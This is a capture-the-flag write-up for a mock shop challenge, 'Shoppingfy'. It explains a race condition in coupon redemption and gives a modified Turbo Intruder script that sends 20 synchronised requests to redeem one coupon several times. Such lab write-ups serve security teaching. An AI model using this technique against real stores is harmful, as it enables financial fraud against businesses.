# Shoppingfy

The challenge is a simple e-commerce application that allows users to buy items. The application allows to redeem a coupon code to get a discount on the products' price. Once registered, the user has not enough money to buy any product. The goal of the challenge is to buy a product.

## Solution

The coupon redemption is vulnerable to race condition attacks. If multiple requests to redeem the coupon are sent at the same time, the server will not be able to handle them properly and the coupon will be redeemed multiple times.

To do this, we can use Burp Suite with the Turbo Intruder extension to send multiple requests at the same time. We need to intercept the request to redeem the coupon and send it to Turbo Intruder. We can use the `race-single-packet-attack.py` script provided by Turbo Intruder to send the requests. We need to slightly modify the [`race-single-packet-attack.py`](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py) script to use HTTP/1 and have the same number of `concurrentConnections` as the number of requests we want to send. The modified script is shown below.

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           engine=Engine.THREADED
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

Launching the attack with Turbo Intruder, we can see that the coupon is redeemed multiple times and the user has enough money to buy a product.
